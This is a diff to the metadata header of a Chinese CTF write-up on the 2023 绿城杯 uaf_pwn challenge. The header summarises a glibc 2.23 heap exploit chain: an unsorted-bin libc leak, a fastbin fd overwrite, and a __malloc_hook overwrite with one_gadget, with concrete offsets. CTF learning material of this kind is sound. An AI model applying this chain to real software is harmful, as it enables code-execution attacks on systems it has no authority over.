@@ -11,7 +11,17 @@ tags:
 - fastbin attack
 - __malloc_hook
 - one_gadget 0x4527a
-attack_chain: malloc(0x100)→unsorted bin→main_arena+88 leak→libc_base→malloc_hook=libc.symbols['__malloc_hook']+libc_base→one_gadget=libc+0x4527a→fill chunk1_fd→malloc(0x60)x2→fill 0x13字节padding+one_gadget→malloc触发
+attack_chain:
+- 'malloc(0x100)'
+- 'unsorted bin'
+- 'main_arena+88 leak'
+- 'libc_base'
+- 'malloc_hook=libc.symbols[''__malloc_hook'']+libc_base'
+- 'one_gadget=libc+0x4527a'
+- 'fill chunk1_fd'
+- 'malloc(0x60)x2'
+- 'fill 0x13字节padding+one_gadget'
+- 'malloc触发'
 key_payload: malloc(0x100);free(0);show(0)→leak main_arena+88;libc_base=leak-0x3c4b78;__malloc_hook=libc_base+offset;one_gadget=libc+0x4527a;fill(1, p64(malloc_hook-0x23))
 one_liner: 绿城杯UAF_pwn：unsorted bin泄main_arena+88+fastbin attack改__malloc_hook为one_gadget
 lesson: UAF + unsorted bin leak + fastbin fd覆盖到__malloc_hook是经典glibc 2.23 pwn模板
@@ -57,6 +67,8 @@ prerequisites:
 - unsorted bin 残留指针与 main_arena 关系
 - fastbin attack + fake chunk size 对齐
 - one_gadget 工具与 libc 版本对应
+contest_normalized: "绿城杯"
+contest_year: 2023
 ---
 # 漏洞学习之PWN-绿城杯uaf_pwn 分析
 
